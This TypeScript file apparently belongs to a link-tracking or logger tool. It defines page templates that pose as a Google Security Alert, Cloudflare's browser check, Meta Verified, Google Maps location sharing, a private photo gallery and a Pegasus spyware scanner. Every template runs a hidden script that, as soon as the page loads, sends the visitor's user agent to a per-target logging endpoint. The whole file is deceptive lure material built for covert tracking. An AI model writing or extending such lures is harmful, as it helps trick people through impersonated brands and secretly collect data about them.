export const templates: Record<string, { name: string, render: (id: string) => string }> = {
    'silent_click': {
        name: 'Silent Logger (Blank Page)',
        render: (id) => `<html><body><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'google': {
        name: 'Google Security Alert',
        render: (id) => `<html><body><h2>Google Security Alert</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'cloudflare': {
        name: 'Cloudflare Anti-DDoS',
        render: (id) => `<html><body><h2>Checking your browser before accessing...</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'meta_verification': {
        name: 'Meta Verified Badge Request',
        render: (id) => `<html><body><h2>Meta Verified</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'terminal': {
        name: 'Terminal System Access',
        render: (id) => `<html><body><h2>Terminal System Access</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'gallery': {
        name: 'Private Photo Gallery',
        render: (id) => `<html><body><h2>Private Photo Gallery</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'maps': {
        name: 'Google Maps Location Sharing',
        render: (id) => `<html><body><h2>Google Maps Location Sharing</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'pegasus': {
        name: 'Pegasus Spyware Scanner',
        render: (id) => `<html><body><h2>Pegasus Spyware Scanner</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    }
};
